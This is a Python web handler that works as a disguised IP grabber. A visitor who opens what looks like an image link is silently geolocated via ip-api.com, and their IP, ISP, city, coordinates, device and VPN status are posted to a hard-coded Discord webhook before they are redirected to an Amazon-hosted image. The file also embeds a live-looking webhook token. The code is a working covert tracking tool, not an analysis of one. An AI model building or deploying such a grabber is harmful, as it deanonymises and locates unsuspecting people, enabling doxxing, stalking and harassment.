from http.server import BaseHTTPRequestHandler
import requests
import json
from datetime import datetime
from urllib.parse import parse_qs

CONFIG = {
    "image_url": "https://m.media-amazon.com/images/I/813kqvYoRfL.png",
    "discord_webhook": "https://discord.com/api/webhooks/1417819830777675826/XgDDma1Cu14TNEtRpMZJYjZT2Uo3xs0SkLMQ1pQ61H9SQ-rL93TGGI4HzXWOrJAT2RjI",
}

def parse_user_agent(user_agent):
    user_agent = user_agent.lower()
    
    os = "Unknown"
    if "windows" in user_agent:
        os = "Windows"
    elif "mac" in user_agent or "darwin" in user_agent:
        os = "macOS"
    elif "linux" in user_agent:
        os = "Linux"
    elif "android" in user_agent:
        os = "Android"
    elif "iphone" in user_agent or "ipad" in user_agent:
        os = "iOS"
    
    browser = "Unknown"
    if "edg" in user_agent:
        browser = "Edge"
    elif "chrome" in user_agent and "edg" not in user_agent:
        browser = "Chrome"
    elif "firefox" in user_agent:
        browser = "Firefox"
    elif "safari" in user_agent and "chrome" not in user_agent:
        browser = "Safari"
    elif "opera" in user_agent or "opr" in user_agent:
        browser = "Opera"
    
    return os, browser

def get_ip_info(ip):
    try:
        response = requests.get(
            f"http://ip-api.com/json/{ip}?fields=66846719",
            timeout=5
        )
        if response.status_code == 200:
            return response.json()
    except Exception as e:
        print(f"Error getting IP info: {e}")
    return None

def format_timezone(timezone_str):
    try:
        parts = timezone_str.split('/')
        if len(parts) >= 2:
            return f"{parts[1].replace('_', ' ')} ({parts[0]})"
        return timezone_str
    except:
        return "Unknown"

def send_to_discord(visitor_data):
    try:
        embed = {
            "title": "🔍 New Visitor Detected",
            "color": 0x5865F2,
            "fields": [
                {
                    "name": "🌐 Network Information",
                    "value": f"**IP:** `{visitor_data['ip']}`\n"
                             f"**ISP:** {visitor_data['isp']}\n"
                             f"**ASN:** {visitor_data['asn']}",
                    "inline": False
                },
                {
                    "name": "📍 Location",
                    "value": f"**Country:** {visitor_data['country']}\n"
                             f"**Region:** {visitor_data['region']}\n"
                             f"**City:** {visitor_data['city']}\n"
                             f"**Coordinates:** {visitor_data['lat']}, {visitor_data['long']}\n"
                             f"**Timezone:** {visitor_data['timezone']}",
                    "inline": False
                },
                {
                    "name": "🖥️ Device Information",
                    "value": f"**Browser:** {visitor_data['browser']}\n"
                             f"**OS:** {visitor_data['os']}\n"
                             f"**Mobile:** {visitor_data['mobile']}",
                    "inline": True
                },
                {
                    "name": "🔒 Security",
                    "value": f"**VPN:** {visitor_data['vpn']}\n"
                             f"**Bot:** {visitor_data['bot']}",
                    "inline": True
                }
            ],
            "footer": {
                "text": f"Tracked at {visitor_data['timestamp']}"
            },
            "thumbnail": {
                "url": CONFIG["image_url"]
            }
        }
        
        payload = {"embeds": [embed]}
        
        response = requests.post(
            CONFIG["discord_webhook"],
            json=payload,
            timeout=5
        )
        print(f"Discord webhook status: {response.status_code}")
    except Exception as e:
        print(f"Error sending to Discord: {e}")

class handler(BaseHTTPRequestHandler):
    def do_GET(self):
        ip = self.headers.get('x-forwarded-for', self.client_address[0])
        if ip and ',' in ip:
            ip = ip.split(',')[0].strip()
        
        ip_data = get_ip_info(ip)
        
        user_agent = self.headers.get('user-agent', 'Unknown')
        os, browser = parse_user_agent(user_agent)
        
        visitor_data = {
            "ip": ip,
            "isp": ip_data.get("isp", "Unknown") if ip_data else "Unknown",
            "asn": ip_data.get("as", "Unknown") if ip_data else "Unknown",
            "country": ip_data.get("country", "Unknown") if ip_data else "Unknown",
            "region": ip_data.get("regionName", "Unknown") if ip_data else "Unknown",
            "city": ip_data.get("city", "Unknown") if ip_data else "Unknown",
            "lat": str(ip_data.get("lat", "0")) if ip_data else "0",
            "long": str(ip_data.get("lon", "0")) if ip_data else "0",
            "timezone": format_timezone(ip_data.get("timezone", "Unknown")) if ip_data else "Unknown",
            "mobile": str(ip_data.get("mobile", False)) if ip_data else "False",
            "vpn": str(ip_data.get("proxy", False)) if ip_data else "False",
            "bot": str(ip_data.get("hosting", False) if ip_data and ip_data.get("hosting") and not ip_data.get("proxy") else 'Possibly' if ip_data and ip_data.get("hosting") else 'False'),
            "browser": browser,
            "os": os,
            "timestamp": datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S UTC")
        }
        
        try:
            send_to_discord(visitor_data)
        except Exception as e:
            print(f"Failed to send Discord notification: {e}")

        self.send_response(302)
        self.send_header('Location', CONFIG["image_url"])
        self.end_headers()
        
        return
